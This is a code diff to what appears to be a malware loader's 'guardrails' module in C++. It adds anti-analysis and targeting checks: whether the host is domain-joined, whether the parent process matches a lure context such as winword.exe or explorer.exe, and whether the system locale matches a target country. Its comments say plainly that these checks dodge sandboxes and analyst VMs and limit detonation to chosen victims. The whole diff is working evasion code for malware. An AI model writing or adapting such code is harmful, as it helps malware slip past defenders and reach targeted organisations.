@@ -8,6 +8,23 @@
 
 #pragma comment(lib, "iphlpapi.lib")
 #pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "netapi32.lib")
+
+// NetGetJoinInformation / NetApiBufferFree are declared manually rather
+// than via <lmjoin.h> / <lmapibuf.h> because loader.hpp already provides a
+// local typedef for NETSETUP_JOIN_STATUS and pulling in the MinGW headers
+// produces a conflicting-declaration error. NERR_Success = 0.
+#ifndef NERR_Success
+#define NERR_Success 0
+#endif
+extern "C" {
+    DWORD __stdcall NetGetJoinInformation(
+        LPCWSTR lpServer,
+        LPWSTR* lpNameBuffer,
+        PNETSETUP_JOIN_STATUS BufferType
+    );
+    DWORD __stdcall NetApiBufferFree(LPVOID Buffer);
+}
 
 namespace erebus {
 namespace guardrails {
@@ -62,6 +79,12 @@ GuardrailConfig GetDefaultConfig() {
     config.check_hardware_breakpoints = false;
     config.check_timing_checks = false;
     config.check_sandbox_environment = false;
+
+    config.check_domain_joined = false;
+    config.allowed_parents = nullptr;
+    config.parent_count_allowed = 0;
+    config.allowed_locales = nullptr;
+    config.locale_count_allowed = 0;
 
     return config;
 }
@@ -128,9 +151,145 @@ CheckResult RunGuardrails(const GuardrailConfig& config) {
         if (!result.passed) return result;
     }
 
+    if (config.check_domain_joined) {
+        result = CheckDomainJoined();
+        if (!result.passed) return result;
+    }
+
+    if (config.allowed_parents && config.parent_count_allowed > 0) {
+        result = CheckParentProcess(config.allowed_parents, config.parent_count_allowed);
+        if (!result.passed) return result;
+    }
+
+    if (config.allowed_locales && config.locale_count_allowed > 0) {
+        result = CheckLocale(config.allowed_locales, config.locale_count_allowed);
+        if (!result.passed) return result;
+    }
+
     // All checks passed
     result.passed = true;
     result.reason = "All guardrail checks passed";
+    return result;
+}
+
+// ---------------------------------------------------------------------------
+// CheckDomainJoined: NetGetJoinInformation returns NetSetupDomainName on
+// domain-joined hosts. Standalone sandboxes and analyst VMs almost never
+// mirror the target's AD topology, so this is one of the cheapest and
+// highest-signal guardrails available. One netapi32 call, no network IO.
+// ---------------------------------------------------------------------------
+CheckResult CheckDomainJoined() {
+    CheckResult result = { false, "domain-join check failed" };
+    LPWSTR buffer = nullptr;
+    NETSETUP_JOIN_STATUS status = NetSetupUnknownStatus;
+    if (NetGetJoinInformation(nullptr, &buffer, &status) == NERR_Success) {
+        if (buffer) NetApiBufferFree(buffer);
+        if (status == NetSetupDomainName) {
+            result.passed = true;
+            result.reason = "host is domain-joined";
+            return result;
+        }
+        result.reason = "host is not domain-joined";
+        return result;
+    }
+    return result;
+}
+
+// ---------------------------------------------------------------------------
+// CheckParentProcess: walk the snapshot, find our parent PID, then compare
+// its image name (leaf only, case-insensitive) against the allowlist. This
+// catches sandbox harnesses that spawn samples from cmd/rundll32/python
+// rather than the expected lure context (explorer.exe for ISO payloads,
+// winword.exe for macros, etc.).
+// ---------------------------------------------------------------------------
+static DWORD GetParentPid(DWORD selfPid) {
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snap == INVALID_HANDLE_VALUE) return 0;
+    PROCESSENTRY32 pe = {};
+    pe.dwSize = sizeof(pe);
+    DWORD parent = 0;
+    if (Process32First(snap, &pe)) {
+        do {
+            if (pe.th32ProcessID == selfPid) {
+                parent = pe.th32ParentProcessID;
+                break;
+            }
+        } while (Process32Next(snap, &pe));
+    }
+    CloseHandle(snap);
+    return parent;
+}
+
+static bool GetProcessLeafName(DWORD pid, char* out, DWORD outSize) {
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snap == INVALID_HANDLE_VALUE) return false;
+    PROCESSENTRY32 pe = {};
+    pe.dwSize = sizeof(pe);
+    bool found = false;
+    if (Process32First(snap, &pe)) {
+        do {
+            if (pe.th32ProcessID == pid) {
+                // szExeFile is already the leaf image name (A/W depending
+                // on build config).
+                DWORD i = 0;
+                for (; i < outSize - 1 && pe.szExeFile[i]; ++i) out[i] = (char)pe.szExeFile[i];
+                out[i] = '\0';
+                found = true;
+                break;
+            }
+        } while (Process32Next(snap, &pe));
+    }
+    CloseHandle(snap);
+    return found;
+}
+
+CheckResult CheckParentProcess(const char** allowed, int allowed_count) {
+    CheckResult result = { false, "parent process check failed" };
+    DWORD parent = GetParentPid(GetCurrentProcessId());
+    if (!parent) return result;
+    char name[MAX_PATH] = {};
+    if (!GetProcessLeafName(parent, name, sizeof(name))) return result;
+    for (int i = 0; i < allowed_count; ++i) {
+        if (StrEqualI(name, allowed[i])) {
+            result.passed = true;
+            result.reason = "parent process matched allowlist";
+            return result;
+        }
+    }
+    result.reason = "parent process not in allowlist";
+    return result;
+}
+
+// ---------------------------------------------------------------------------
+// CheckLocale: format the user's default LCID as 4-digit lowercase hex and
+// compare against the allowlist. Cheap targeting check - if the operator
+// only wants to detonate on hosts with a specific regional setting (e.g.
+// targeting a financial institution in a specific country), this blocks
+// sandboxes and analyst VMs configured with en-US defaults.
+// ---------------------------------------------------------------------------
+static void FormatLcidHex(LCID lcid, char* out /*>=5*/) {
+    const char* digits = "0123456789abcdef";
+    unsigned v = (unsigned)(lcid & 0xFFFF);
+    out[0] = digits[(v >> 12) & 0xF];
+    out[1] = digits[(v >> 8) & 0xF];
+    out[2] = digits[(v >> 4) & 0xF];
+    out[3] = digits[v & 0xF];
+    out[4] = '\0';
+}
+
+CheckResult CheckLocale(const char** allowed, int allowed_count) {
+    CheckResult result = { false, "locale check failed" };
+    LCID lcid = GetUserDefaultLCID();
+    char hex[8] = {};
+    FormatLcidHex(lcid, hex);
+    for (int i = 0; i < allowed_count; ++i) {
+        if (StrEqualI(hex, allowed[i])) {
+            result.passed = true;
+            result.reason = "locale matched allowlist";
+            return result;
+        }
+    }
+    result.reason = "locale not in allowlist";
     return result;
 }
 
